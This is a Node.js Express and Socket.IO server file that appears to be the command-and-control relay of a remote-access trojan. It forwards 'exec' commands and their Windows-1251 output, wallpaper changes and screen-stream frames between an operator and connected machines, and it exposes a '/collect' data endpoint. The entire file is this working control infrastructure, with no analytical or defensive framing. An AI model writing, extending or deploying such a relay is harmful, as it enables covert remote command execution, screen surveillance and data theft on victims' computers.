const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const fileUpload = require('express-fileupload');
const path = require('path');

const iconv = require("iconv-lite");

const collectRouter = require('./routers/collectRouter');
const infoRouter = require('./routers/infoRouter');

class Server {

    app = null;
    http = null;
    io = null;
    wss = null;

    constructor(options = {}, routers = []) {
        this.options = {
            host: "localhost",
            port: 3000
        }

        this.routers = routers;

        Object.assign(this.options, options);

        this.init();
        this.initRouters();

        this.socketIO();

        this.start();
    }

    init() {
        this.app = express();

        this.app.use(cors());

        this.http = require('http').createServer(this.app);
        this.wss = require('socket.io').Server;
        this.io = new this.wss(this.http, { 
            cors: { origin: "*" }, 
            pingInterval: 30000,
            pingTimeout: 25000,
            maxHttpBufferSize: 1204 * 1024 * 1024
         });

        this.app.use(express.json());
        this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));
        this.app.use(fileUpload());
        this.app.use(express.static(path.join(__dirname, "../static")));

        // this.app.use(async (req, res, next) => {
        //     await new Promise(resolve => setTimeout(resolve, 1000));
        //     next();
        // });
    }

    initRouters() {
        this.app.get("/", (req, res) => {
            res.sendFile(path.join(__dirname, "/files/index.html"));
        });

        this.routers.forEach((router) => {
            this.app.use("/api" + router.path, router.router);
        });
    }

    async connectDB() {
        try {
            await mongoose.connect("mongodb://localhost:27017/messiah");
            console.log("[SERVER] MongoDB Connected");
        } catch (exception) {
            console.error(exception);
        }
    }

    async start() {
        await this.connectDB();
        //this.options.port, this.options.host,
        this.http.listen(this.options.port, () => {
            console.log(`[SERVER] http://${this.options.host}:${this.options.port}/`);
        });
    }

    async socketIO() {
        this.io.on('connection', (socket) => {
            console.log('[SOCKET] Connected: ' + socket.id);

            socket.on('disconnect', (reason) => {
                console.log('[SOCKET] Disconnected: ' + socket.id + ' (' + reason + ')' );
            });

            socket.on('room', (room) => {
                socket.join(room);
                console.log('[SOCKET] Join room: ' + room);

                socket.on('ping', () => {
                    socket.broadcast.to(room).emit('ping', `ping`);
                });

                socket.on('pong', () => {
                    socket.broadcast.to(room).emit('pong', `pong`);
                });

                socket.on('exec', (data) => {
                    socket.broadcast.to(room).emit('exec', data);
                });

                socket.on('change_wallpaper', (data) => {
                    socket.broadcast.to(room).emit('change_wallpaper', data);
                });

                socket.on('change_wallpaper_result', (data) => {
                    socket.broadcast.to(room).emit('change_wallpaper_result', data);
                });

                socket.on('stream_request', (data) => {
                    socket.broadcast.to(room).emit('stream_request', data);
                });

                socket.on('stream_close', (data) => {
                    socket.broadcast.to(room).emit('stream_close', data);
                });

                socket.on('stream_tick', (data) => {
                    socket.broadcast.to(room).emit('stream_tick', data);
                });

                socket.on('exec_output', (data) => {
                    socket.broadcast.to(room).emit('exec_output', iconv.decode(Buffer.from(data), 'win1251'));
                });
            });
        });
    }
}

const server = new Server( 
    { port: 7777, host: "11.10.5.5" }, 
    [
        { path: '/collect', router: collectRouter},
        {path: '/info', router: infoRouter}
    ]
);